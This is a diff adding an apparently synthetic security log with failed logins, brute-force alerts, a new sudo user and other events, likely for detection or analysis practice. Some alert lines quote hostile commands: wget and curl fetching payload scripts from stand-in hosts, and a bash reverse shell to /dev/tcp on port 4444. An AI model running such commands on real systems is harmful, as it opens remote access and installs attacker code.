@@ -1,0 +1,36 @@
+2026-06-01 08:12:15 INFO User login successful | user=john | ip=192.168.1.10
+2026-06-01 08:15:42 WARNING Failed login attempt | user=admin | ip=192.168.1.25
+2026-06-01 08:16:03 WARNING Failed login attempt | user=admin | ip=192.168.1.25
+2026-06-01 08:16:21 WARNING Failed login attempt | user=admin | ip=192.168.1.25
+2026-06-01 08:17:04 ALERT Multiple failed login attempts detected | ip=192.168.1.25
+
+2026-06-01 09:02:33 INFO User login successful | user=sarah | ip=10.0.0.12
+2026-06-01 09:05:10 INFO Password changed | user=sarah | ip=10.0.0.12
+
+2026-06-01 10:11:45 WARNING Failed login attempt | user=root | ip=45.77.12.3
+2026-06-01 10:11:58 WARNING Failed login attempt | user=root | ip=45.77.12.3
+2026-06-01 10:12:05 ALERT Possible brute force attack detected | ip=45.77.12.3
+
+2026-06-01 11:00:01 INFO Admin login successful | user=administrator | ip=172.16.0.5
+2026-06-01 11:03:19 INFO New user created | user=testuser | created_by=administrator
+2026-06-01 11:04:50 INFO User added to sudo group | user=testuser
+
+2026-06-01 12:20:33 WARNING Suspicious command executed | command=wget http://malicious-site.com/payload.sh
+2026-06-01 12:21:11 WARNING Suspicious command executed | command=curl http://evil-domain.com/backdoor.sh
+
+2026-06-01 13:15:40 INFO File uploaded | user=john | filename=report.pdf
+2026-06-01 13:18:55 INFO File downloaded | user=john | filename=confidential.xlsx
+
+2026-06-01 14:44:20 ERROR Unauthorized access attempt | user=guest | ip=103.55.66.77
+2026-06-01 14:44:25 ERROR Unauthorized access attempt | user=guest | ip=103.55.66.77
+
+2026-06-01 15:30:10 INFO Service restarted | service=nginx
+2026-06-01 15:31:55 INFO Configuration updated | user=administrator
+
+2026-06-01 16:05:22 WARNING Failed login attempt | user=developer | ip=203.0.113.5
+2026-06-01 16:06:01 INFO User login successful | user=developer | ip=203.0.113.5
+
+2026-06-01 17:45:30 ALERT Reverse shell signature detected | ip=198.51.100.23
+2026-06-01 17:45:31 ALERT Command detected | bash -i >& /dev/tcp/198.51.100.23/4444
+
+2026-06-01 18:00:00 INFO Daily backup completed successfully
